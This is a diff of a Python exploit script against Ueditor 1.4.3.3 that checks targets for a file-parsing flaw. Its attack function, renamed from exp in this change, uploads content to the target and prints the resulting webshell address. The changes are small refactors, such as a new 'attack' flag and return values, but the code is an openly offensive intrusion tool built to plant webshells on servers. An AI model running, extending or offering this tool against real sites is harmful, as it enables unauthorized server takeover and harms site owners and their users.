@@ -10,7 +10,8 @@ disable_warnings(InsecureRequestWarning)
 def verify(url):
     relsult = {
         'name': 'Ueditor编辑器1.4.3.3 解析漏洞',
-        'vulnerable': False
+        'vulnerable': False,
+        'attack': True,
     }
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
@@ -32,7 +33,6 @@ def verify(url):
                 relsult['position'] = 'data'
                 relsult['payload'] = payload
                 relsult['verify'] = verify_url
-                relsult['exp'] = True
                 relsult['about'] = 'https://www.cnblogs.com/hei-zi/p/13394764.html'
 
         return relsult
@@ -49,7 +49,9 @@ def output(relsult):
         else:
             print('     ', r.capitalize(), ':', relsult[r])
     print('\n---')
-def exp(url):
+    
+    
+def attack(url):
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
         'Content-Type': 'application/x-www-form-urlencoded',
@@ -66,5 +68,7 @@ def exp(url):
         upload_path = re.findall(r'"url":"(.*)"', req2.text)[0]
         webshell = urllib.parse.urljoin(vulurl, upload_path)
         print('[+] Webshell地址:', webshell)
+        return True
+    return False
 
 
